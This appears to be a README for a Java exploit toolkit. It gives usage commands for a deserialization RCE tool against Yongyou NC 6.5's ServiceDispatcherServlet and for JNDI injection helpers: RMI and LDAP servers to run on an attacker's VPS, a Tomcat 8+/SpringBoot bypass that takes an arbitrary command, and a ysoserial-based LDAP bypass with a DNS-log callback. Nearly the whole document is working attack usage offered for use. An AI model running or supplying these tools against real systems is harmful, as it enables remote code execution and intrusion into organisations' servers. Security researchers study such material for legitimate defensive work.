# JAVA学习写的小工具

## nc65ServiceDispatcherServlet-RCE

``` shell
# nc65-ServiceDispatcherServlet
# A simple tools to exploit yongyou-nc-65 by ServiceDispatcherServlet DeSerialized
# first open a ldap serevr for access remote class on your vps
java -jar nc65-ServiceDispatcherServlet.jar http://127.0.0.1 ldap://127.0.0.1/exp
```

## JNDIInjectionExploitUtils

> Simple RMIServer

``` shell
# RMIServer.jar 
# A simple tools for start RMIServer on your vps
# Only Support to JDK 8u121、7u131、6u141 and below
java -jar RMIServer.jar httpServerAddress expClassName RMIServerPort
```

> RMIServer Bypass Tomcat 8+ SpringBoot 1.2.x+

```shell
# RMIServerTomcat8+Bypass.jar
# A simple tools to for start RMIServer on your vps
# Need target have Tomcat 8+ or SpringBoot 1.2.x+ environment
# cmd format like '/bin/zsh','-c','open /System/Applications/Calculator.app'"
java -jar RMIServerTomcat8+Bypass.java RMIServerPort cmd
```

> Simple LDAPServer

``` shell
# LDAPServer.jar
# A simple tools for start LDAPServer on your vps
# Only Support to JDK 11.0.1、8u191、7u201、6u211 and below
java -jar LDAPServer.jar httpServerAddress/#expClassName LDAPServerPort
```

> LDAPServer javaSerializedData Bypass

```shell
# LDAPServerBypass.jar 
# Need target have DeSerialized Gadget
# Generate DeSerialized Gadget base64 data
java -jar ysoserial.jar URLDNS "http://dnslog" | base64
# Start LDAPServer on your vps
java -jar LDAPServerBypass.jar localPort base64SerializedData
```

